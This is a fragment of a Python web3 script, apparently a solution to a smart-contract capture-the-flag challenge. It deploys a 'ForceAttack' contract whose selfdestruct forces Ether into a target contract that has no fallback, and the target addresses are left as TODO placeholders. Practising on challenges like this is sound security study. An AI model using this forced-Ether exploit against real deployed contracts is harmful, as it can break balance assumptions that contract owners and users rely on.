# The objective of this challenge is to send Ether to a contract without a fallback function
# the only way to do this is to send via another contract selfdestruction. We deploy a 
# "bomb" contract with a payable selfdestruction function and we pass the target address.
# It is important to notice that the selfdestruct opcode is being deprecated in next solidity
# version.
...
# We proceed to instance the "bomb" contract
buildFile = open('artifacts/contracts/ForceAttack.sol/ForceAttack.json', "r")
...
# We call the bomb function with the target address and sending some Ether
myBalance = w3Provider.eth.getBalance('') #TODO: Include the target contract address
print("Target balance: " + str(myBalance))
transaction = attackContract.functions.bomb('').transact({'value': 1}) #TODO: Include the target contract address
